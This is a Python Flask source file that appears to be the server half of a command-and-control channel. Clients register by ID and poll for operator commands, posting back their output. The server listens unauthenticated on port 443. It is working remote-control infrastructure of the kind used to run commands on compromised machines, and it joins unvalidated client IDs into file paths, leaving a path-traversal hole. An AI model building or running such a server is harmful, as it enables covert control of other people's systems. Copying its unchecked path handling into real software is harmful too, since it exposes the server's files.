from flask import Flask, request, jsonify, send_from_directory
import os
import json

app = Flask(__name__)
DATA_DIR = "client_data"

if not os.path.exists(DATA_DIR):
    os.makedirs(DATA_DIR)

@app.route("/register", methods=["POST"])
def register_client():
    data = request.json
    client_id = data.get("client_id")
    if not client_id:
        return jsonify({"error": "Missing client_id"}), 400
    client_path = os.path.join(DATA_DIR, client_id)
    if not os.path.exists(client_path):
        os.makedirs(client_path)
    cmd_file = os.path.join(client_path, "cmd.json")
    output_file = os.path.join(client_path, "output.json")
    if not os.path.exists(cmd_file):
        with open(cmd_file, "w") as f:
            json.dump({}, f)
    if not os.path.exists(output_file):
        with open(output_file, "w") as f:
            json.dump({"output": ""}, f)
    return jsonify({"message": f"Registered {client_id}"}), 201
@app.route("/get_clients", methods=["GET"])
def get_clients():
    clients = [d for d in os.listdir(DATA_DIR) if os.path.isdir(os.path.join(DATA_DIR, d))]
    return jsonify({"clients": clients}), 200
@app.route("/send_command/<client_id>", methods=["POST"])
def send_command(client_id):
    client_path = os.path.join(DATA_DIR, client_id)
    if not os.path.exists(client_path):
        return jsonify({"error": "Client not found"}), 404
    data = request.json
    command = data.get("command")
    if not command:
        return jsonify({"error": "Missing command"}), 400
    cmd_file = os.path.join(client_path, "cmd.json")
    with open(cmd_file, "w") as f:
        json.dump({"command": command}, f)
    return jsonify({"message": f"Command sent to {client_id}"}), 200
@app.route("/receive_output/<client_id>", methods=["POST"])
def receive_output(client_id):
    client_path = os.path.join(DATA_DIR, client_id)
    if not os.path.exists(client_path):
        return jsonify({"error": "Client not found"}), 404
    data = request.json
    output = data.get("output", "")
    output_file = os.path.join(client_path, "output.json")
    with open(output_file, "w") as f:
        json.dump({"output": output}, f)
    cmd_file = os.path.join(client_path, "cmd.json")
    with open(cmd_file, "w") as f:
        json.dump({}, f)
    return jsonify({"message": "Output received"}), 200
@app.route("/client_data/<client_id>/cmd.json", methods=["GET"])
def get_command(client_id):
    """Fetches the command for a client."""
    client_path = os.path.join(DATA_DIR, client_id)
    cmd_file = os.path.join(client_path, "cmd.json")

    if not os.path.exists(cmd_file):
        return jsonify({"error": "Command file not found"}), 404

    return send_from_directory(client_path, "cmd.json")
@app.route("/client_data/<client_id>/output.json", methods=["GET"])
def get_output(client_id):
    client_path = os.path.join(DATA_DIR, client_id)
    output_file = os.path.join(client_path, "output.json")
    if not os.path.exists(output_file):
        return jsonify({"error": "Output file not found"}), 404
    return send_from_directory(client_path, "output.json")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=443)
